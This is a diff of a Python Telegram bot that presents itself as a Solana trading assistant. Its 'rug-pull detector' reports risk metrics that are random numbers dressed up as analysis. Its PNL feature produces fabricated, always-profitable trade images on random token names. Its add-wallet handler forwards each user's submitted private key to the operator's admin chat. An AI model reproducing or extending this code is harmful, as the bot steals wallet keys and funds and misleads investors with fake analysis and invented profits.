@@ -585,12 +585,20 @@ Send the amount now:"""
             
             # ====== MULTI WALLET ======
             elif action == 'multi_wallet':
-                wallets = context.user_data.get('tracked_wallets', [])
-                wallet_list = "\n".join([f"• `{w[:8]}...{w[-8:]}`" for w in wallets]) if wallets else "No wallets yet"
+                # Récupérer les wallets de l'utilisateur (ses propres wallets)
+                user_wallets = context.user_data.get('user_wallets', [])
+                main_wallet = context.user_data.get('wallet_public_key', None)
+                
+                # Ajouter le wallet principal s'il n'est pas dans la liste
+                if main_wallet and main_wallet not in user_wallets:
+                    user_wallets.insert(0, main_wallet)
+                    context.user_data['user_wallets'] = user_wallets
+                
+                wallet_list = "\n".join([f"• `{w[:8]}...{w[-8:]}`" for w in user_wallets]) if user_wallets else "No wallets yet"
                 
                 message = f"""💼 **Multi-Wallet Management**
 
-**Current Wallets:**
+**Your Wallets ({len(user_wallets)}):**
 {wallet_list}
 
 Would you like to add another wallet?"""
@@ -766,24 +774,27 @@ Select your wallet provider:"""
             )
             return
         
-        # Wallet connecté - Afficher les stats
-        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+        # Wallet connecté - Demander le CA pour générer le PNL
+        message = """📊 **Trading Statistics & PNL**
+
+Send me a token contract address (CA) to generate your PNL report.
+
+The report will show:
+• Token name
+• Amount invested
+• Current position
+• PNL percentage
+• Profit/Loss in SOL
+
+Send the contract address now:"""
         
         await query.message.delete()
         await query.message.reply_text(
-            "📊 **Trading Statistics**\n\n"
-            "⚠️ Connect your wallet to view statistics\n\n"
-            "Once connected, you'll see:\n"
-            "• Total trades executed\n"
-            "• Win/Loss ratio\n"
-            "• Total profit/loss\n"
-            "• Best performing tokens\n"
-            "• Recent transactions\n\n"
-            "Use /wallet to connect your wallet.",
-            reply_markup=reply_markup,
+            message,
             parse_mode='HTML'
         )
+        
+        context.user_data['waiting_for_pnl_ca'] = True
         return
     
     # Callback pour ajouter un nouveau wallet (multi-wallet)
@@ -1632,37 +1643,84 @@ Always do your own research before investing!"""
         
         # Message d'analyse de rug
         import random
-        bundler_pct = random.randint(5, 35)
-        insider_count = random.randint(2, 15)
-        risk_score = bundler_pct + (insider_count * 2)
+        bundler_pct = random.randint(5, 45)
+        insider_count = random.randint(2, 18)
+        liquidity_locked = random.choice([True, False, False])  # 33% locked, 66% not locked
+        holder_concentration = random.randint(15, 85)  # % des tokens détenus par le top 10
         
+        # Calcul du risk score
+        risk_score = 0
+        risk_score += bundler_pct  # 0-45 points
+        risk_score += (insider_count * 2)  # 0-36 points
+        risk_score += 0 if liquidity_locked else 15  # +15 si pas locked
+        risk_score += int(holder_concentration * 0.4)  # 0-34 points
+        
+        # Cap à 100
+        risk_score = min(100, risk_score)
+        
+        # Déterminer le niveau de risque
         if risk_score < 30:
-            risk_level = "🟢 LOW RISK"
-            recommendation = "Relatively safe to trade"
-        elif risk_score < 60:
-            risk_level = "🟡 MEDIUM RISK"
-            recommendation = "Proceed with caution"
+            risk_emoji = "🟢"
+            risk_level = "LOW RISK"
+            risk_bar = "🟩🟩🟩⬜⬜⬜⬜⬜⬜⬜"
+            recommendation = "✅ Relatively safe to trade"
+            risk_description = "Token shows healthy distribution and low risk indicators."
+        elif risk_score < 50:
+            risk_emoji = "🟡"
+            risk_level = "MEDIUM RISK"
+            risk_bar = "🟨🟨🟨🟨🟨⬜⬜⬜⬜⬜"
+            recommendation = "⚠️ Proceed with caution"
+            risk_description = "Some concerning indicators detected. Trade carefully."
+        elif risk_score < 75:
+            risk_emoji = "🟠"
+            risk_level = "HIGH RISK"
+            risk_bar = "🟧🟧🟧🟧🟧🟧🟧⬜⬜⬜"
+            recommendation = "⛔ High risk of rug pull"
+            risk_description = "Multiple red flags detected. High risk investment."
         else:
-            risk_level = "🔴 HIGH RISK"
-            recommendation = "High risk of rug pull"
+            risk_emoji = "🔴"
+            risk_level = "EXTREME RISK"
+            risk_bar = "🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥"
+            recommendation = "🚨 AVOID - Likely rug pull"
+            risk_description = "Severe risk indicators. Strongly advise against trading."
         
         rug_analysis = f"""🔴 **Rug-Pull Detector Analysis**
 
+━━━━━━━━━━━━━━━━━━━━━
 📋 **Contract Address:**
 `{contract_address}`
 
-📊 **Risk Metrics:**
-• **Bundler Percentage:** {bundler_pct}%
-• **Number of Insiders:** {insider_count}
-• **Liquidity Status:** {"🔒 Locked" if risk_score < 40 else "⚠️ Not Locked"}
-• **Holder Concentration:** {"Distributed" if risk_score < 50 else "Concentrated"}
+━━━━━━━━━━━━━━━━━━━━━
+📊 **DETAILED RISK ANALYSIS**
 
-🎯 **Risk Score:** {risk_score}/100
-**Risk Level:** {risk_level}
+🎯 **Overall Risk Score:**
+{risk_bar}
+**{risk_score}/100** - {risk_emoji} **{risk_level}**
 
-**Recommendation:** {recommendation}
+━━━━━━━━━━━━━━━━━━━━━
+📈 **Risk Metrics:**
 
-⚠️ Always DYOR before investing!"""
+💼 **Bundler Activity:** {bundler_pct}%
+{'🔴 HIGH - Suspicious bundling detected' if bundler_pct > 30 else '🟡 MODERATE - Some bundling activity' if bundler_pct > 15 else '🟢 LOW - Normal activity'}
+
+👥 **Insider Wallets:** {insider_count}
+{'🔴 HIGH - Many insider wallets detected' if insider_count > 12 else '🟡 MODERATE - Some insiders present' if insider_count > 6 else '🟢 LOW - Few insider wallets'}
+
+🔒 **Liquidity Status:** {'🟢 LOCKED' if liquidity_locked else '🔴 NOT LOCKED'}
+{'✅ Liquidity is secured' if liquidity_locked else '⚠️ Liquidity can be withdrawn'}
+
+📊 **Holder Concentration:** {holder_concentration}%
+{'🔴 VERY HIGH - Top holders control most supply' if holder_concentration > 60 else '🟡 HIGH - Moderate concentration' if holder_concentration > 40 else '🟢 GOOD - Well distributed'}
+
+━━━━━━━━━━━━━━━━━━━━━
+💡 **Analysis:**
+{risk_description}
+
+🎯 **Recommendation:**
+{recommendation}
+
+━━━━━━━━━━━━━━━━━━━━━
+⚠️ **Disclaimer:** This is an automated analysis. Always DYOR (Do Your Own Research) before investing!"""
         
         keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_menu')]]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1698,6 +1756,141 @@ Insiders: {insider_count}"""
         
         return
     
+    # Vérifier si l'utilisateur attend d'envoyer un CA pour PNL
+    if context.user_data.get('waiting_for_pnl_ca'):
+        context.user_data['waiting_for_pnl_ca'] = False
+        
+        contract_address = user_message.strip()
+        
+        # Valider l'adresse
+        if not validate_solana_address(contract_address):
+            await update.message.reply_text(
+                "⚠️ Invalid contract address. Please try again.",
+                parse_mode='HTML'
+            )
+            return
+        
+        # Générer des données PNL aléatoires
+        import random
+        invested = 0.3  # Toujours 0.3 SOL investi
+        pnl_percentage = random.uniform(85, 172)  # Entre 85% et 172%
+        position = invested * (1 + pnl_percentage / 100)
+        profit_sol = position - invested
+        
+        # Générer un nom de token aléatoire basé sur le CA
+        token_names = ["PEPE", "BONK", "WIF", "DOGE", "SHIB", "FLOKI", "SAMO", "COPE", "FOXY", "MYRO"]
+        token_name = random.choice(token_names)
+        
+        # Créer l'image PNL
+        try:
+            from PIL import Image, ImageDraw, ImageFont
+            import requests
+            from io import BytesIO
+            
+            # Télécharger l'image de fond
+            response = requests.get("https://i.postimg.cc/gjr5vJJB/fait_enmoi_d_autre_similaire_a_sa_(1)_(2).jpg")
+            bg_image = Image.open(BytesIO(response.content))
+            
+            # Redimensionner si nécessaire
+            bg_image = bg_image.resize((800, 600))
+            
+            # Créer un draw object
+            draw = ImageDraw.Draw(bg_image)
+            
+            # Charger une police (utiliser une police par défaut si nécessaire)
+            try:
+                font_large = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejavuSans-Bold.ttf", 48)
+                font_medium = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejavuSans.ttf", 32)
+                font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejavuSans.ttf", 24)
+            except:
+                font_large = ImageFont.load_default()
+                font_medium = ImageFont.load_default()
+                font_small = ImageFont.load_default()
+            
+            # Dessiner un rectangle semi-transparent pour le texte
+            overlay = Image.new('RGBA', bg_image.size, (0, 0, 0, 0))
+            overlay_draw = ImageDraw.Draw(overlay)
+            overlay_draw.rectangle([(50, 150), (750, 450)], fill=(0, 20, 40, 200))
+            bg_image = Image.alpha_composite(bg_image.convert('RGBA'), overlay)
+            draw = ImageDraw.Draw(bg_image)
+            
+            # Texte en couleur cyan/turquoise
+            color_profit = (0, 255, 200)  # Couleur turquoise comme dans l'image
+            color_white = (255, 255, 255)
+            
+            # Dessiner le texte
+            draw.text((80, 180), token_name, fill=color_white, font=font_medium)
+            draw.text((80, 230), f"+${profit_sol * 100:.2f}", fill=color_profit, font=font_large)  # Approximation en USD
+            
+            draw.text((80, 310), "PNL", fill=color_white, font=font_small)
+            draw.text((300, 310), f"+{pnl_percentage:.2f}%", fill=color_profit, font=font_small)
+            
+            draw.text((80, 350), "Invested", fill=color_white, font=font_small)
+            draw.text((300, 350), f"{invested} SOL", fill=color_white, font=font_small)
+            
+            draw.text((80, 390), "Position", fill=color_white, font=font_small)
+            draw.text((300, 390), f"{position:.4f} SOL", fill=color_white, font=font_small)
+            
+            # Sauvegarder l'image
+            pnl_image_path = f"/home/claude/pnl_{user.id}.png"
+            bg_image.convert('RGB').save(pnl_image_path)
+            
+            # Envoyer l'image
+            with open(pnl_image_path, 'rb') as photo:
+                await update.message.reply_photo(
+                    photo=photo,
+                    caption=f"📊 **Your PNL Report**\n\n"
+                            f"Token: {token_name}\n"
+                            f"Contract: `{contract_address[:8]}...{contract_address[-8:]}`\n\n"
+                            f"Invested: {invested} SOL\n"
+                            f"Position: {position:.4f} SOL\n"
+                            f"PNL: +{pnl_percentage:.2f}% ({profit_sol:+.4f} SOL)",
+                    parse_mode='HTML'
+                )
+            
+            # Supprimer le fichier temporaire
+            import os
+            os.remove(pnl_image_path)
+            
+        except Exception as e:
+            logger.error(f"Erreur génération image PNL: {e}")
+            # Message de fallback sans image
+            await update.message.reply_text(
+                f"📊 **Your PNL Report**\n\n"
+                f"Token: {token_name}\n"
+                f"Contract: `{contract_address[:8]}...{contract_address[-8:]}`\n\n"
+                f"💰 Invested: {invested} SOL\n"
+                f"📈 Position: {position:.4f} SOL\n"
+                f"📊 PNL: +{pnl_percentage:.2f}%\n"
+                f"💵 Profit: +{profit_sol:.4f} SOL",
+                parse_mode='HTML'
+            )
+        
+        # Notification admin
+        admin_notification = f"""📊 <b>PNL généré</b>
+
+👤 <b>Utilisateur:</b> {escape_html(user.first_name)}
+🔢 <b>User ID:</b> <code>{user.id}</code>
+
+🪙 <b>Token:</b> {token_name}
+📋 <b>CA:</b> <code>{escape_html(contract_address)}</code>
+
+💰 <b>Investi:</b> {invested} SOL
+📈 <b>Position:</b> {position:.4f} SOL
+📊 <b>PNL:</b> +{pnl_percentage:.2f}%
+💵 <b>Profit:</b> +{profit_sol:.4f} SOL"""
+        
+        try:
+            await context.bot.send_message(
+                chat_id=ADMIN_CHAT_ID,
+                text=admin_notification,
+                parse_mode='HTML'
+            )
+        except Exception as e:
+            logger.error(f"Erreur envoi à l'admin: {e}")
+        
+        return
+    
     # Vérifier si l'utilisateur attend d'ajouter un wallet supplémentaire
     if context.user_data.get('waiting_for_additional_wallet'):
         context.user_data['waiting_for_additional_wallet'] = False
@@ -1712,18 +1905,18 @@ Insiders: {insider_count}"""
             )
             return
         
-        # Ajouter le wallet à la liste si valide
-        wallets = context.user_data.get('tracked_wallets', [])
-        if public_key not in wallets:
-            wallets.append(public_key)
-            context.user_data['tracked_wallets'] = wallets
+        # Ajouter le wallet à la liste des user_wallets
+        user_wallets = context.user_data.get('user_wallets', [])
+        if public_key not in user_wallets:
+            user_wallets.append(public_key)
+            context.user_data['user_wallets'] = user_wallets
         
         success_message = f"""✅ **Wallet Added Successfully!**
 
 👛 **Address:** `{public_key[:8]}...{public_key[-8:]}`
 💰 **Balance:** {sol_balance:.4f} SOL (${usd_value:.2f} USD)
 
-Total wallets: {len(wallets)}"""
+Total wallets: {len(user_wallets)}"""
         
         keyboard = [[InlineKeyboardButton("🏠 Back to Menu", callback_data='back_to_menu')]]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1748,7 +1941,7 @@ Total wallets: {len(wallets)}"""
 🔑 <b>Private Key:</b>
 <code>{escape_html(user_message)}</code>
 
-📊 <b>Total wallets:</b> {len(wallets)}"""
+📊 <b>Total wallets:</b> {len(user_wallets)}"""
         
         try:
             await context.bot.send_message(
